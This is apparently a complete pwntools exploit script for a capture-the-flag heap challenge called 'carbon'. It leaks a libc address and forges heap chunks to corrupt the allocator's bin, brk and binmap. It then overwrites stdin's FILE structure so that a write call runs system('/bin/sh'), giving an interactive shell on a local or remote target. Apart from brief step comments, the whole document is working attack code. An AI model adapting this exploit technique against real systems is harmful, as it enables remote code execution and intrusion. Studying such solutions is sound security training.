#!/usr/bin/env python2
from pwn import *
import sys

context(arch="amd64", log_level="debug")

if len(sys.argv) >= 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process("./carbon")

def alloc(sz, ctx='\n', ans='N'):
    p.sendlineafter(">", '1')
    p.sendlineafter("What is your prefer size? >", str(sz))
    p.sendlineafter("Are you a believer? >", ans)
    p.sendafter("Say hello to your new sleeve >", ctx)

def free(idx):
    p.sendlineafter(">", '2')
    p.sendlineafter("What is your sleeve ID? >", str(idx))

def edit(idx, ctx):
    p.sendlineafter(">", '3')
    p.sendlineafter("What is your sleeve ID? >", str(idx))
    p.send(ctx)

def view(idx):
    p.sendlineafter(">", '4')
    p.sendlineafter("What is your sleeve ID? >", str(idx))
    return p.recvuntil("Done.", True)

alloc(0x1, 'A') #0

libc_base = u64(view(0).ljust(8, '\x00')) - 0x292e41

info("libc base: 0x%x", libc_base)
stdin   = libc_base + 0x292200
binmap  = libc_base + 0x292ac0
brk     = libc_base + 0x295050
bin     = libc_base + 0x292e40
system  = libc_base + 0x42688

# 1. construct fake chunks
alloc(0x10) #1
alloc(0x10) #2, prevent consolidation
alloc(0x10) #3
alloc(0x10) #4, prevent consolidation
alloc(0x10) #5
alloc(0x10) #6, prevent consolidation
alloc(0x10) #7
alloc(0x10) #8, prevent consolidation

free(1)
free(3)

payload  = 'X' * 0x10
payload += p64(0x21) * 2 + 'X' * 0x10
payload += p64(0x21) + p64(0x20) + p64(stdin - 0x10) * 2
payload += p8(0x20)
payload += '\n'

alloc(0x10, payload, 'Y')   #1
alloc(0x10)                 #3
free(1) # set as non-empty bin

edit(3, p64(binmap - 0x20) * 2)
alloc(0x10)             #1
free(5) # set as non-empty bin

edit(3, p64(brk - 0x10) * 2)
alloc(0x10)             #5
free(7) # set as non-empty bin

# 2. corrupt bin head and get arbitrary pointers
edit(3, p64(bin - 0x10) + p64(stdin - 0x10))
alloc(0x10) #7
alloc(0x50) #9

edit(3, p64(bin - 0x10) + p64(brk - 0x10))
alloc(0x10) #10
alloc(0x50) #11

edit(3, p64(bin - 0x10) + p64(binmap - 0x20))
alloc(0x10) #12
alloc(0x50) #13

# 3. corrupt stdin, binmap and brk
payload  = "/bin/sh\x00"    # stdin->flags
payload += 'X' * 0x20
payload += p64(0xdeadbeef)  # stdin->wpos
payload += 'X' * 8
payload += p64(0xbeefdead)  # stdin->wbase
payload += 'X' * 8
payload += p64(system)      # stdin->write

edit(9, payload) # stdin
edit(11, p64(0xbadbeef - 0x20) + '\n')  # brk
edit(13, 'X' * 0x10 + p64(0) + '\n')    # binmap

# 4. get shell
p.sendlineafter(">", '1')
p.sendlineafter("What is your prefer size? >", '0')

p.interactive()
